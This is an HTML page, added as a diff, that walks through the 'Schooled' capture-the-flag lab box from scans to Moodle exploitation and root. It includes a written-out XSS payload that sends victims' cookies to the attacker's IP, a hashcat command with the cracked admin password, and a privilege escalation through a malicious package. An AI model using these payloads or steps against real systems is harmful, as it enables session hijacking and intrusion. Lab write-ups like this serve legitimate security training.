@@ -1,0 +1,229 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Schooled Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Schooled Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#www-data">Shell - www-data</a></li>
+        <li><a href="#jamie">Shell - jamie</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>Gaining a foothold on this box requires brute forcing for subdomains.  Once the subdomain is found a combination of 2 web exploits are required to gain code execution as www-data.  Once on the box, a database configuration file reveals the password to the mysql database.  The mysql database contains hashed passwords for Moodle users.  Cracking the admin hash reveals a password which is reused by the user jamie.  Jamie has sudo permissions to the pkg install command.  Exploiting this permission gives root code execution.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre># Nmap 7.91 scan initiated Fri Nov 12 15:47:35 2021 as: nmap -p- -oN ping_tcp 10.129.96.53&#13;&#10;Nmap scan report for 10.129.96.53&#13;&#10;Host is up (0.041s latency).&#13;&#10;Not shown: 65532 closed ports&#13;&#10;PORT      STATE SERVICE&#13;&#10;22/tcp    open  ssh&#13;&#10;80/tcp    open  http&#13;&#10;33060/tcp open  mysqlx&#13;&#10;&#13;&#10;# Nmap done at Fri Nov 12 15:54:45 2021 -- 1 IP address (1 host up) scanned in 430.67 seconds&#13;&#10;</pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre># Nmap 7.91 scan initiated Fri Nov 12 15:55:08 2021 as: nmap -p22,80,33060 -sV -sC -oN script_tcp 10.129.96.53&#13;&#10;Nmap scan report for 10.129.96.53&#13;&#10;Host is up (0.040s latency).&#13;&#10;&#13;&#10;PORT      STATE SERVICE VERSION&#13;&#10;22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)&#13;&#10;|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)&#13;&#10;|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)&#13;&#10;80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)&#13;&#10;| http-methods: &#13;&#10;|_  Potentially risky methods: TRACE&#13;&#10;|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15&#13;&#10;|_http-title: Schooled - A new kind of educational institute&#13;&#10;33060/tcp open  mysqlx?&#13;&#10;| fingerprint-strings: &#13;&#10;|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: &#13;&#10;|     Invalid message&quot;&#13;&#10;|     HY000&#13;&#10;|   LDAPBindReq: &#13;&#10;|     *Parse error unserializing protobuf message&quot;&#13;&#10;|     HY000&#13;&#10;|   oracle-tns: &#13;&#10;|     Invalid message-frame.&quot;&#13;&#10;|_    HY000&#13;&#10;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&#13;&#10;SF-Port33060-TCP:V=7.91%I=7%D=11/12%Time=618ED4B9%P=x86_64-pc-linux-gnu%r(&#13;&#10;SF:NULL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\0\x0b&#13;&#10;SF:\x08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPO&#13;&#10;SF:ptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RTSPRequest,9,&quot;\x05\0\0\0\x0&#13;&#10;SF:b\x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVer&#13;&#10;SF:sionBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusRequestTCP,&#13;&#10;SF:2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0f&#13;&#10;SF:Invalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;&#13;&#10;SF:)%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0&#13;&#10;SF:1\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServerCooki&#13;&#10;SF:e,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\0\x0b\&#13;&#10;SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&#13;&#10;SF:&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,&#13;&#10;SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05&#13;&#10;SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY&#13;&#10;SF:000&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString&#13;&#10;SF:,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x&#13;&#10;SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x0fInvalid\x20message\&quot;&#13;&#10;SF:\x05HY000&quot;)%r(LDAPBindReq,46,&quot;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01&#13;&#10;SF:\x08\x01\x10\x88&apos;\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20m&#13;&#10;SF:essage\&quot;\x05HY000&quot;)%r(SIPOptions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LA&#13;&#10;SF:NDesk-RC,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0&#13;&#10;SF:\0\x0b\x08\x05\x1a\0&quot;)%r(NCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesR&#13;&#10;SF:PC,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\&#13;&#10;SF:x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\&#13;&#10;SF:x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,32,&#13;&#10;SF:&quot;\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&apos;\x1a\x16Invali&#13;&#10;SF:d\x20message-frame\.\&quot;\x05HY000&quot;)%r(ms-sql-s,9,&quot;\x05\0\0\0\x0b\x08\x05\&#13;&#10;SF:x1a\0&quot;)%r(afp,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x1&#13;&#10;SF:0\x88&apos;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;);&#13;&#10;Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Nov 12 15:55:31 2021 -- 1 IP address (1 host up) scanned in 23.54 seconds</pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>SSH is an uncommon first point of attack and we are unable to connect to the sql server on 33060.  So I turn my attention to the web server on port 80.</li>
+
+    <img src="../images/schooled/port80.png">
+    
+    <br>
+    <br>
+
+    <li>The first piece of interesting information I find on this website are the teachers names on /teachers.html, found from the menu on the top right of the web page.  I take note of these</li>
+    
+    <br>
+    
+    <li>The second piece of interesting information I find is at the bottom of the web page where I find the domain name "schooled.htb" being used underneat contact details.</li>
+
+    <img src="../images/schooled/contactdetails.png">
+
+    <br>
+    <br>
+
+    <li>I add this domain to my /etc/hosts file.</li>
+
+    <img src="../images/schooled/hosts.png">
+
+    <br>
+    <br>
+
+    <li>I visit the web page http://schooled.htb but it loads the same website I saw before.  After investigating the website a bit I decide to see if any subdomains exist for schooled.htb.  In order to do this I use the fuzzing tool, ffuf.</li>
+
+    <img src="../images/schooled/ffuf.png">
+    
+    <br>
+    <br>
+
+    <li>I add moodle.schooled.htb to my /etc/hosts file and then visit the webpage http://moodle.schooled.htb and I find a moodle website.  One of the first things I do is search for moodle exploits.  Using searchsploit I find a bunch of different ones for a wide range of Moodle versions.  I notice a few remote code execution exploits that stand out.  The most recent one is for Moodle 3.9.  I know this box came out somewhat recently so I am inclined to believe the Moodle version running will be more recent.</li>
+
+    <img src="../images/schooled/searchsploit.png">
+
+    <br>
+    <br>
+
+    <li>After going to google and finding the github page for Moodle I am able to look through the file structure for Moodle.  I end up finding a changelog in theme/upgrade.txt.  So I go back to the web server and visit "http://moodle.schooled.htb/moodle/theme/upgrade.txt".  On this page I find the changelog and find the version number of Moodle that is running is 3.9.  I take a closer look at the RCE exploit for version 3.9 I found using searchsploit and it says that it requires authentication as a teacher in order to use the exploit.  I look around the website some more and end up creating a user on the website.</li>
+    
+
+    <img src="../images/schooled/usercreation.png">
+    
+    <br>
+    <br>
+
+    <li>The email is required to end in @student.schooled.htb so I update that and end up creating an account.  This also means the user we have created is likely a student account, not a teacher account, which is required for the RCE exploit.  Once logged in I click on the "Site Home" button.  This brings me to a list of classes, "Mathematics", "Scientific Research", "Information Technology", and "Englist Literature".  I click on each one and the only one that gives me the option to enroll is Mathematics.  I select "Enrol me" and the Mathematics page gives a larger sidebar menu and access to "Announcements".</li>
+
+    <img src="../images/schooled/math.png">
+
+    <br>
+    <br>
+
+    <li>I click on "Announcements" and then I click on the subject "Reminder for joining students".  This message from the course teacher, Manuel Phillips, talks about how students need to have their MoodleNet profiles set.  It also says that the the teacher will be checking this.  I click on the "Profile" from the dropdown menu next to my user name on the top right.</li>
+
+    <img src="../images/schooled/profile.png">
+
+    <br>
+    <br>
+
+    <li>Then I select "Edit profile"</li>
+
+    <img src="../images/schooled/editprofile.png">
+
+    <br>
+    <br>
+
+    <li>On this page I find an empty field for "MoodleNet" profile.  At this point I turn to google and search for "moodlenet profile exploit".  The top search results returns with "https://github.com/HoangKien1020/CVE-2020-25627".</li>
+
+    <img src="../images/schooled/moodlnetexploit.png">
+
+    <br>
+    <br>
+
+    <h2><a id="www-data">Shell - www-data</a></h2>
+
+    <li>This page instructs us to enter the XSS payload <code>&lt;script&gt;var i=new Image;i.src=&quot;http://192.168.0.238/xss.php?&quot;+document.cookie;&lt;/script&gt;</code> in the the MoodleNet Profile field in order to steal cookies.  I change the ip in the url to my own ip.  Then I enter this into my MoodleNet Profile field.</li>
+
+    <img src="../images/schooled/xss.png">
+
+    <br>
+    <br>
+
+    <li>Then I select "Update profile" from the bottom of the page.  After doing that, I start a web server on port 80 using <code>sudo python3 -m http.server 80</code>.  After a few minutes I see a GET request for <code>/xss.php?MoodleSession=hrotmglu9b3dhhklj31jipnmtn</code>.  Every few minutes a new web request comes in with a new cookie value, so it appears the teachers cookie changing every few minutes.  I keep the web server running so I can have access to the latest cookie.</li>
+
+    <img src="../images/schooled/teachercookie.png">
+
+    <br>
+    <br>
+
+    <li>Now we have access to a teacher account that we can use with the RCE exploit I found earlier.  I download the exploit and run it.</li>
+    
+    <img src="../images/schooled/50180.png">
+
+    <br>
+    <br>
+
+    <li>Running the exploit shows me which flags to use.  I use the cookie flag to set the cookie for the teacher account and the -c flag to include a command to gain a reverse shell.</li>
+
+    <img src="../images/schooled/revshell.png">
+
+    <br>
+    <br>
+
+    <li>After gaining a shell I attempt to upgrade it but neither "python" or "python3" show up in my path.</li>
+
+    <img src="../images/schooled/shellupgrade.png">
+
+    <br>
+    <br>
+
+    <h2><a id="jamie"></a>Shell - jamie</h2>
+
+    <li>As www-data I navigate to the moodle web directory and find the config file for the sql database.</li>
+
+    <img src="../images/schooled/sql_creds.png">
+
+    <br>
+    <br>
+
+    <li>In this file I find the sql credentials.  I login to the sql database</li>
+
+    <img src="../images/schooled/sql_login.png">
+
+    <br>
+    <br>
+
+    <li>I look at the databases, select the moodle database, then view the tables for the moodle database.</li>
+
+    <img src="../images/schooled/mysql_tables.png">
+
+    <br>
+    <br>
+
+    <li>I find the table "mdl_user".  This table has a lot of columns which makes it difficult to read.  I use <code>moodle@localhost [moodle]> select username,password from mdl_user;</code> in order to view only the usernames and passwords.  I take the hash for admin, "$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW", and crack it using hashcat.  I use the hash identifier on hashes.com to identify the hash type.  It identifies the has as bcrypt.  Then I go to the hashcat wiki page (https://hashcat.net/wiki/doku.php?id=example_hashes) that lists the different hash modes and find bcrpyt.  The mode for bcrypt appears to be 3200.  Now I crack the hash.</li> 
+
+    <br>
+
+    <li>Using the command <code>.\hashcat.exe -a 0 -m 3200 $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW rockyou.txt</code> I crack the hash and the password is "!QAZ2wsx".  Using this password I attempt to access the other users on the box in case the password is being reused.  First I identify users that have shell access.  Then I use the <code>su &lt;username&gt;</code> to try to switch users.</li>
+
+    <img src="../images/schooled/jamie_shell.png">
+
+    <br>
+    <br>
+
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>I check the sudo permissions for Jamie.</li>
+
+    <img src="../images/schooled/sudo.png">
+
+    <br>
+    <br>
+
+    <li>Then I go to https://gtfobins.github.io/# and search for "pkg" and select "sudo" since jamie has sudo access to this command.</li>
+
+    <img src="../images/schooled/gtfobins.png">
+
+    <br>
+    <br>
+
+    <li>According to gtfo bins we need to use the "fpm" command to create a package that we will install using sudo which will activate a script that we choose and give us command execution as root.  I do not find the fpm on the machine.  I do have fpm installed on my Kali machine already.</li>
+
+    <br>
+
+    <li>First I create the malicious package file</li>
+
+    <img src="../images/schooled/pkg_create.png">
+
+    <br>
+    <br>
+
+    <li>I then tranfer that package file to the victim machine and run the sudo command as shown in gtfo bins.  This creates the rootbash file.</li>
+
+    <img src="../images/schooled/sudo2.png">
+
+    <br>
+    <br>
+
+    <li>Then I execute the rootbash file with the "-p" flag and I gain a shell with root permissions.</li>
+
+    <img src="../images/schooled/rootbash.png">
+
+</body>
+</html>
+
